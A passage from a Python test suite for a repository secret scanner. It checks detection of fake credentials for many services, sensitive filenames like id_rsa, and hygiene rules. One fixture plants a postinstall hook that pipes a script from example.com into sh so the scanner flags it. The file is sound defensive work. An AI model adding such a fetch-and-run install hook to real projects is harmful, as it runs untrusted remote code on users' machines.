        )
        self.assertEqual(f["file"], ".npmrc")

    def test_scans_netrc_passwords(self):
        f = self._detect_in_file(
            ".netrc",
            "machine api.company.local login deploy password " + "A1b2C3d4E5f6G7h8I9j0",
            "netrc_password",
        )
        self.assertEqual(f["file"], ".netrc")

    def test_scans_basic_auth_urls(self):
        f = self._detect_in_file(
            "config.json",
            '{"endpoint": "https://deploy:'
            + "A1b2C3d4E5f6G7h8I9j0"
            + '@api.company.local"}',
            "basic_auth_url",
        )
        self.assertEqual(f["file"], "config.json")

    def test_skips_lockfile_integrity_hash_noise(self):
        with tempfile.TemporaryDirectory(prefix="butian-secret-lock-") as root:
            with open(os.path.join(root, "package-lock.json"), "w") as f:
                f.write(
                    '{"packages":{"node_modules/demo":{"integrity":"sha512-'
                    + "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789" * 3
                    + '"}}}'
                )
            self.assertEqual(scan.scan_secrets(root), [])


class NewSecretPreviewTests(unittest.TestCase):
    def test_generic_token_preview(self):
        result = scan.secret_preview("generic_token", 'token = "abc123"')
        self.assertIn("***", result)

    def test_generic_secret_preview(self):
        result = scan.secret_preview("generic_secret", 'secret_key = "xyz789"')
        self.assertIn("***", result)

    def test_connection_string_preview(self):
        result = scan.secret_preview(
            "connection_string",
            'connection_string = "postgres://..."',  # fake fixture
        )
        self.assertIn("***", result)

    def test_encryption_key_preview(self):
        result = scan.secret_preview(
            "encryption_key",
            'aes_key = "abcdef0123456789abcdef"',  # fake fixture
        )
        self.assertIn("***", result)

    def test_base64_secret_preview(self):
        result = scan.secret_preview(
            "base64_secret", 'secret_base64 = "SGVsbG8gV29ybGQ="'
        )
        self.assertIn("***", result)

    def test_stripe_publishable_medium(self):
        """stripe_publishable_key should be medium confidence (not in HIGH set)."""
        self.assertNotIn("stripe_publishable_key", scan.HIGH_CONFIDENCE_SECRET_TYPES)

    def test_aws_access_key_high(self):
        """aws_access_key should be high confidence."""
        self.assertIn("aws_access_key", scan.HIGH_CONFIDENCE_SECRET_TYPES)


class ContextDependentTests(unittest.TestCase):
    """Ensure context-dependent patterns (datadog, jenkins, etc.) only match
    when the service name appears as context."""

    def _detect_types(self, content: str) -> list[str]:
        with tempfile.TemporaryDirectory(prefix="butian-ctx-") as root:
            with open(os.path.join(root, "config.py"), "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            return [f["type"] for f in findings]

    def test_datadog_with_context(self):
        types = self._detect_types(
            'datadog_api_key = "9a8b7c6d' + '5e4f3a2b1c0d9e8f7a6b5c4d"'  # fake fixture
        )
        self.assertIn("datadog_api_key", types)

    def test_datadog_without_context(self):
        types = self._detect_types(
            "random_value = 9a8b7c6d" + "5e4f3a2b1c0d9e8f7a6b5c4d"
        )
        self.assertNotIn("datadog_api_key", types)

    def test_jenkins_with_context(self):
        types = self._detect_types(
            'jenkins_token = "a1b2c3d4'
            + 'e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"'  # fake fixture
        )
        self.assertIn("jenkins_token", types)

    def test_jenkins_without_context(self):
        types = self._detect_types(
            "random_data = a1b2c3d4" + "e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"
        )
        self.assertNotIn("jenkins_token", types)

    def test_atlassian_with_context(self):
        types = self._detect_types(
            'jira_token = "abcdefgh' + 'ijklmnopqrstuvwx"'  # fake fixture
        )
        self.assertIn("atlassian_token", types)

    def test_atlassian_without_context(self):
        types = self._detect_types("some_id = abcdefgh" + "ijklmnopqrstuvwx")
        self.assertNotIn("atlassian_token", types)


class ExhaustiveSecretPatternTests(unittest.TestCase):
    """One test per untested SECRET_PATTERN to ensure 100% pattern coverage."""

    def _detect_one(self, content: str, expected_type: str) -> dict:
        with tempfile.TemporaryDirectory(prefix="butian-exh-") as root:
            with open(os.path.join(root, "config.py"), "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            matches = [f for f in findings if f["type"] == expected_type]
            self.assertGreaterEqual(
                len(matches),
                1,
                f"Expected at least 1 finding of type '{expected_type}', "
                f"got {[(f['type'], f['line']) for f in findings]}",
            )
            return matches[0]

    # --- Remaining Cloud Providers ---
    def test_aws_secret_key(self):
        # Exactly 40 chars matching [A-Za-z0-9/+=]
        val40 = "A" * 40  # simplest guaranteed 40-char value
        self._detect_one(f'AWS_SECRET_ACCESS_KEY = "{val40}"', "aws_secret_key")

    def test_gcp_oauth_token(self):
        self._detect_one(
            'TOKEN = "ya29' + '.a0AfH6SMBx..."',
            "gcp_oauth_token",  # fake fixture
        )

    def test_azure_client_secret(self):
        self._detect_one(
            'azure_client_secret = "abc123' + 'DEF456-ghi789JKL012-mno345PQR678stu"',
            "azure_client_secret",  # fake fixture
        )

    def test_azure_sas_token(self):
        self._detect_one(
            'SAS = "sv='
            + '2023-01-01&ss=b&srt=sco&sp=rwdlacupx&se=2024-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=abcdefghijklm"',  # fake fixture
            "azure_sas_token",
        )

    def test_aliyun_secret_key(self):
        self._detect_one(
            'ALIYUN_SECRET_KEY = "a1b2c3d4' + 'e5f6g7h8i9j0k1l2m3n4o5p6q7r8"',
            "aliyun_secret_key",  # fake fixture
        )

    def test_huawei_access_key(self):
        self._detect_one(
            'HUAWEI_ACCESS_KEY = "ABCDEFGH' + '1234567890abcd"',
            "huawei_access_key",  # fake fixture
        )

    def test_huawei_secret_key(self):
        self._detect_one(
            'HUAWEI_SECRET_KEY = "a1b2c3d4' + 'e5f6g7h8i9j0k1l2m3n4o5p"',
            "huawei_secret_key",  # fake fixture
        )

    def test_linode_api_key(self):
        self._detect_one('linode_api_key = "' + "a" * 64 + '"', "linode_api_key")

    def test_vultr_api_key(self):
        self._detect_one(
            'vultr_api_key = "ABCDEFGH' + '1234567890abcdefghijklmnopqrstuv"',
            "vultr_api_key",  # fake fixture
        )

    def test_cloudflare_api_key(self):
        self._detect_one(
            'CF = "v1.0-' + "a" * 24 + "-" + "b" * 146 + '"', "cloudflare_api_key"
        )

    def test_cloudflare_origin_ca(self):
        self._detect_one(
            'CERT = "-----BEGIN '
            + 'ORIGIN CERTIFICATE-----\nMII....\n-----END ORIGIN CERTIFICATE-----"',  # fake fixture
            "cloudflare_origin_ca",
        )

    def test_heroku_api_key(self):
        self._detect_one(
            'heroku_api_key = "12345678' + "-1234-1234-" + '1234-123456789012"',
            "heroku_api_key",  # fake fixture
        )

    # --- Remaining SaaS Tokens ---
    def test_github_oauth(self):
        self._detect_one(
            'TOKEN = "gho_' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"',
            "github_oauth",  # fake fixture
        )

    def test_github_app_token(self):
        self._detect_one(
            'TOKEN = "ghu_' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"',
            "github_app_token",  # fake fixture
        )

    def test_github_refresh_token(self):
        self._detect_one(
            'TOKEN = "ghr_' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"',
            "github_refresh_token",  # fake fixture
        )

    def test_slack_webhook(self):
        self._detect_one(
            'URL = "https://hooks.slack.com'
            + '/services/T12345678/B12345678/abcdefghijklmnopqrstuvwx"',  # fake fixture
            "slack_webhook",
        )

    def test_discord_bot_token(self):
        self._detect_one(
            'BOT_TOKEN = "MTIzNDU2'
            + 'Nzg5MDEyMzQ1Njc4O.Yabcde.abcdefghijk1mnopqrstuvwxzABCD"',  # fake fixture
            "discord_bot_token",
        )

    def test_discord_webhook(self):
        self._detect_one(
            'URL = "https://discord.com'
            + '/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwx"',  # fake fixture
            "discord_webhook",
        )

    def test_stripe_publishable_key(self):
        self._detect_one(
            'KEY = "pk_live_' + 'abcdefghijklmnopqrstuvwxyz1234"',
            "stripe_publishable_key",  # fake fixture
        )

    def test_stripe_restricted_key(self):
        self._detect_one(
            'KEY = "rk_live_' + 'abcdefghijklmnopqrstuvwxyz1234"',
            "stripe_restricted_key",  # fake fixture
        )

    def test_twilio_api_key(self):
        self._detect_one(
            'KEY = "SK' + 'abcdef1234567890abcdef1234567890"',
            "twilio_api_key",  # fake fixture
        )

    def test_mailgun_api_key(self):
        self._detect_one(
            'KEY = "key-' + 'abcdefghijklmnopqrstuvwxyz123456"',
            "mailgun_api_key",  # fake fixture
        )

    def test_mailchimp_api_key(self):
        self._detect_one(
            'KEY = "abcdef01' + '23456789abcdef0123456789-us1"',
            "mailchimp_api_key",  # fake fixture
        )

    def test_square_access_token(self):
        self._detect_one(
            'TOKEN = "sq0atp-' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ"',
            "square_access_token",  # fake fixture
        )

    def test_square_oauth_secret(self):
        self._detect_one(
            'SECRET = "sq0csp-'
            + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklm"',  # fake fixture
            "square_oauth_secret",
        )

    def test_shopify_token(self):
        self._detect_one(
            'TOKEN = "shpat_' + 'abcdef0123456789abcdef"',
            "shopify_token",  # fake fixture
        )

    def test_paypal_bearer_token(self):
        self._detect_one(
            'TOKEN = "access_token'
            + '$production$abcdefghijklmnopqrstuvwxyz1234567890abcd"',  # fake fixture
            "paypal_bearer_token",
        )

    def test_braintree_token(self):
        self._detect_one(
            'TOKEN = "access_token'
            + '$production$abcdefghijklmnopqrst$abcdef0123456789abcdef0123456789abcd"',  # fake fixture
            "braintree_token",
        )

    def test_firebase_key(self):
        self._detect_one(
            'firebase_key = "a1b2c3d4'
            + 'e5f6g7h8i9j0k1l2m3n4o5p6q7r8"',  # fake fixture
            "firebase_key",
        )

    def test_datadog_app_key(self):
        self._detect_one('datadog_app_key = "' + "a" * 40 + '"', "datadog_app_key")

    def test_newrelic_key(self):
        self._detect_one(
            'NR = "NRAK' + 'ABCDEFGHIJKLMNOPQRSTUV"',
            "newrelic_key",  # fake fixture
        )

    def test_pagerduty_token(self):
        self._detect_one(
            'pagerduty_token = "abcdefgh' + 'ijklmnopqrstuvwxYZ01234567"',
            "pagerduty_token",  # fake fixture
        )

    def test_grafana_api_key(self):
        self._detect_one(
            'grafana_api_key = "eyJhbGci'
            + 'OiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123def456ghi789"',  # fake fixture
            "grafana_api_key",
        )

    def test_npm_token(self):
        self._detect_one(
            'NPM = "//registry.npmjs.org'
            + "/:_authToken=12345678-"
            + "1234-1234-"
            + '1234-123456789012"',  # fake fixture
            "npm_token",
        )

    def test_terraform_token(self):
        self._detect_one(
            'TF = "abcdefghijklmn.atlasv1.' + "a" * 50 + '"',
            "terraform_token",
        )

    def test_circleci_token(self):
        self._detect_one(
            'CI = "CCIRERES_' + 'ABCDEFGHIJKLMNOPQRSTUV"',
            "circleci_token",  # fake fixture
        )

    def test_travis_token(self):
        self._detect_one(
            'travis_ci_token = "ABCDEFGHIJ' + 'KLMNOPQRSTUVWXYZabcdefgh"',
            "travis_token",  # fake fixture
        )

    def test_buildkite_token(self):
        self._detect_one('BK = "bkua_' + "a" * 40 + '"', "buildkite_token")

    def test_jfrog_token(self):
        self._detect_one(
            'JFROG = "cmVmdA' + '.abcdefghijklmnopqrstuvwx"',
            "jfrog_token",  # fake fixture
        )

    def test_postman_api_key(self):
        self._detect_one(
            'POSTMAN = "PMAK-' + 'abcdefghijklmnopqrstuvwxyz1234"',
            "postman_api_key",  # fake fixture
        )

    def test_openai_key(self):
        self._detect_one(
            'OPENAI = "sk-proj-' + 'abcdefghijklmnopqrstuvwxyz1234567890"',
            "openai_key",  # fake fixture
        )

    def test_google_ai_key(self):
        # google_ai_key shares the AIza prefix with gcp_api_key; covered by gcp_api_key
        self._detect_one(
            'GOOGLE_AI = "AIzaSy' + 'A1234567890abcdefghijklmnopqrstuv"',
            "gcp_api_key",  # fake fixture
        )

    def test_replicate_token(self):
        self._detect_one(
            'REPLICATE = "r8_' + 'abcdefghijklmnopqrstuvwxyz1234"',
            "replicate_token",  # fake fixture
        )

    def test_rubygems_token(self):
        self._detect_one(
            'RUBYGEMS = "rubygems_' + 'abcdefghijklmnopqrst"',
            "rubygems_token",  # fake fixture
        )

    def test_nuget_api_key(self):
        self._detect_one('NUGET = "oy2' + "a" * 43 + '"', "nuget_api_key")

    def test_sonar_token(self):
        self._detect_one('SONAR = "squ_' + "a" * 40 + '"', "sonar_token")

    def test_notion_token(self):
        self._detect_one('NOTION = "secret_' + "a" * 40 + '"', "notion_token")

    def test_linear_api_key(self):
        self._detect_one('LINEAR = "lin_api_' + "a" * 40 + '"', "linear_api_key")

    def test_airtable_api_key(self):
        self._detect_one('AIRTABLE = "key' + "a" * 14 + '"', "airtable_api_key")

    def test_airtable_api_key_does_not_match_pubkey_authentication(self):
        with tempfile.TemporaryDirectory(prefix="butian-airtable-") as root:
            with open(os.path.join(root, "auth_options.py"), "w") as f:
                f.write('pubkey_auth = options.get("PubkeyAuthentication")\n')
                f.write('evidence = ["PubkeyAuthentication no"]\n')
            findings = scan.scan_secrets(root)
            self.assertEqual(findings, [])

    def test_asana_token(self):
        self._detect_one(
            'asana_token = "2/' + '1234567890:abcdefghijklmnopqrst"',
            "asana_token",  # fake fixture
        )

    def test_fastly_api_key(self):
        self._detect_one(
            'fastly_api_key = "aB3cD5eF' + '7gH9iJ1kLmNoPqRsT2uV4wX6"',  # fake fixture
            "fastly_api_key",
        )

    def test_ngrok_token(self):
        self._detect_one(
            'ngrok_token = "aB3cD5eF' + '7gH9iJ1kLmNoPqRsT2uV4wX6yZ8"',  # fake fixture
            "ngrok_token",
        )

    def test_sentry_token(self):
        self._detect_one('SENTRY = "sntrys_' + "a" * 40 + '"', "sentry_token")

    def test_amqp_connection(self):
        self._detect_one(
            'AMQP = "amqp'
            + '://user:password123@rabbitmq.prod.internal:5672/vhost"',  # fake fixture
            "amqp_connection",
        )

    def test_kafka_connection(self):
        self._detect_one(
            'kafka_secret_key = "aB3cD5eF' + '7gH9iJ1kLmNoPqRsT"',  # fake fixture
            "kafka_connection",
        )

    # --- Remaining Generic Patterns ---
    def test_private_key(self):
        self._detect_one(
            'CERT = "-----BEGIN '
            + 'RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"',  # fake fixture
            "private_key",
        )

    def test_generic_secret(self):
        self._detect_one(
            'secret_key = "a1b2c3d4' + 'e5f6g7h8i9j0k1l2m3n4o5p6q7r8"',  # fake fixture
            "generic_secret",
        )

    def test_base64_secret(self):
        self._detect_one(
            'secret_base64 = "SGVsbG8g' + 'V29ybGQgSGVsbG8gV29ybGQ="',  # fake fixture
            "base64_secret",
        )

    def test_connection_string(self):
        self._detect_one(
            'connection_string = "Host='
            + 'db.prod.internal;Port=5432;Database=mydb;User=admin;Password=secret123"',  # fake fixture
            "connection_string",
        )

    # --- Generic sk- prefix catch-all ---
    def test_generic_sk_key_minimax(self):
        f = self._detect_one(
            'MINIMAX = "sk-cp-' + 'ZvITPDLf"', "generic_sk_key"
        )  # fake fixture
        self.assertEqual(f["confidence"], "medium")

    def test_generic_sk_key_random(self):
        # 15 chars after sk- is long enough for generic_sk_key (8+) but
        # shorter than openai_key threshold (20+)
        f = self._detect_one(
            'MY_KEY = "sk-' + 'abc123def456ghi"', "generic_sk_key"
        )  # fake fixture
        self.assertEqual(f["confidence"], "medium")

    def test_generic_sk_key_no_false_positive_css(self):
        # CSS properties like "mask-composite" contain "sk-composite" and must NOT match.
        css_lines = [
            "-webkit-mask-composite: xor;",
            "mask-composite: exclude;",
            "div { -webkit-mask-composite: source-over; }",
            "  mask-composite: add;",
        ]
        for line in css_lines:
            with tempfile.TemporaryDirectory(prefix="butian-css-") as root:
                fpath = os.path.join(root, "style.css")
                with open(fpath, "w") as f:
                    f.write(line)
                findings = scan.scan_secrets(root)
                sk_hits = [f for f in findings if f["type"] == "generic_sk_key"]
                self.assertEqual(
                    sk_hits,
                    [],
                    f"CSS false positive: '{line}' should NOT match generic_sk_key",
                )


class ExhaustiveSensitiveFileTests(unittest.TestCase):
    def _type_of(self, filename: str) -> str:
        return scan.sensitive_file_type(filename)

    # Previously untested types
    def test_ssh_key_id_rsa(self):
        self.assertEqual(self._type_of("id_rsa"), "ssh_key")

    def test_ssh_key_id_ed25519(self):
        self.assertEqual(self._type_of("id_ed25519"), "ssh_key")

    def test_credentials_json(self):
        self.assertEqual(self._type_of("credentials.json"), "credentials")

    def test_service_account_json(self):
        self.assertEqual(self._type_of("service-account-prod.json"), "credentials")

    def test_client_secret_json(self):
        self.assertEqual(self._type_of("client_secret_oauth.json"), "credentials")

    def test_sa_key_json(self):
        self.assertEqual(self._type_of("sa-key.json"), "credentials")

    def test_gcp_credentials_file(self):
        self.assertEqual(self._type_of("gcloud-credentials"), "gcp_credentials")

    def test_azure_credentials_file(self):
        self.assertEqual(self._type_of("azureProfile.json"), "azure_credentials")

    def test_gem_credentials(self):
        self.assertEqual(self._type_of(".gem/credentials"), "gem_credentials")

    def test_log_file(self):
        self.assertEqual(self._type_of("app.log"), "log")

    def test_npm_token_file(self):
        # .npmrc is covered by npmrc type, but check SENSITIVE_FILE_PATTERNS entry
        self.assertEqual(self._type_of(".npmrc"), "npmrc")


class ExpandedHygieneIntegrationTests(unittest.TestCase):
    def test_scan_hygiene_includes_local_repository_security_groups(self):
        with tempfile.TemporaryDirectory(prefix="butian-expanded-hygiene-") as root:
            os.makedirs(os.path.join(root, ".github", "workflows"))
            with open(
                os.path.join(root, "package.json"), "w", encoding="utf-8"
            ) as handle:
                json.dump(
                    {
                        "scripts": {
                            "postinstall": "curl https://example.com/install.sh | sh"
                        }
                    },
                    handle,
                )
            with open(
                os.path.join(root, ".github", "workflows", "ci.yml"),
                "w",
                encoding="utf-8",
            ) as handle:
                handle.write(
                    "on: [pull_request]\njobs:\n  test:\n    runs-on: [self-hosted, linux]\n    steps:\n      - uses: actions/checkout@v4\n"
                )
            with open(
                os.path.join(root, "Dockerfile"), "w", encoding="utf-8"
            ) as handle:
                handle.write("FROM node:latest\nRUN npm ci\n")

            result = scan.scan_hygiene(root)

            self.assertEqual(
                set(result),
                {
                    "gitignore_exists",
                    "gitignore_missing",
                    "tracked_secrets",
                    "sensitive_tracked",
                    "repository_checks",
                    "workflow_checks",
                    "iac_checks",
                    "errors",
                    "coverage",
                },
            )
            self.assertIn("coverage", result)
            self.assertEqual(
                {item["id"] for item in result["workflow_checks"]},
                {"actions.missing_permissions", "actions.self_hosted_pr_runner"},
            )
            self.assertTrue(
                any(
                    item["id"] == "supply_chain.suspicious_install_script"
                    for item in result["repository_checks"]
                )
            )
            self.assertTrue(
                any(
                    item["id"] == "iac.docker_latest_tag"
                    for item in result["iac_checks"]
                )
            )
            self.assertEqual(
                set(result["coverage"]),
                {"builtin_rules", "secret_scan"},
            )


if __name__ == "__main__":
    unittest.main()
